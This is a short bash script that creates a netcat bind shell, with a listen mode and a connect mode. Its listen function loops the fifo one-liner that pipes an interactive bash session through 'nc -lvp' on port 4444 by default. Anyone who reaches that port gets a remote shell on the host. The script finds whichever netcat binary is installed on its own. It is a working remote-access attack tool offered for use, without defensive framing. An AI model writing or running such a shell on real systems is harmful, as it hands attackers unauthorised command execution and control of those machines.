#!/usr/bin/env bash

connect() {
    $nc $host $port
}

err() { echo -e "${color:+\e[31m}[!] $@\e[0m"; }

errx() { echo -e "${color:+\e[31m}[!] ${@:2}\e[0m"; exit $1; }

good() { echo -e "${color:+\e[32m}[+] $@\e[0m"; }

info() { echo -e "${color:+\e[37m}[*] $@\e[0m"; }

listen() {
    while :; do
        rm -f $fifo
        mkfifo $fifo
        cat $fifo | bash -i 2>&1 | $nc -lvp $port >$fifo
        sleep 1
    done
    rm -f $fifo
}

long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 1 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}

usage() {
    echo "Usage: ${0/*\//} [OPTIONS]"
    echo
    echo "Create a bind shell"
    echo
    echo "Options:"
    echo "    -c, --connect      Connect to a listening bind_shell"
    echo "                       instance"
    echo "    -f, --fifo=FIFO    Use the specified fifo"
    echo "    -h, --help         Display this help message"
    echo "    --host=HOST        Use the specified host"
    echo "    -l, --listen       Listen for a connection from a"
    echo "                       connecting bind_shell instance"
    echo "    --nc=NC            Use the specified nc binary"
    echo "    --nocolor          Disable colorized output"
    echo "    -p, --port=PORT    Use the specified port"
    echo
    exit $1
}

warn() { echo -e "${color:+\e[33m}[-] $@\e[0m"; }

declare -a args
unset help host
color="true"
fifo="/tmp/f"
if [[ -n $(command -v nc) ]]; then
    nc="$(command -v nc)"
elif [[ -n $(command -v ncat) ]]; then
    nc="$(command -v ncat)"
elif [[ -n $(command -v netcat) ]]; then
    nc="$(command -v netcat)"
fi
port=4444

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-c"|"--connect") action="connect" ;;
        "-f"|"--fifo"*) fifo="$(long_opt "$@")" || shift ;;
        "-h"|"--help") help="true" ;;
        "--host"*) host="$(long_opt "$@")" || shift ;;
        "-l"|"--listen") action="listen" ;;
        "--nc"*) nc="$(long_opt "$@")" || shift ;;
        "--nocolor") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ -z ${args[@]} ]] || set -- "${args[@]}"

# Check for valid params and missing dependencies
[[ -z $help ]] || usage 0
[[ $# -eq 0 ]] || usage 2
[[ -n $action ]] || usage 3
[[ -n $nc ]] || usage 4
[[ -f $nc ]] || usage 5

case "$action" in
    "connect") [[ -n $host ]] || errx 6 "No host provided"; connect ;;
    "listen") listen ;;
esac
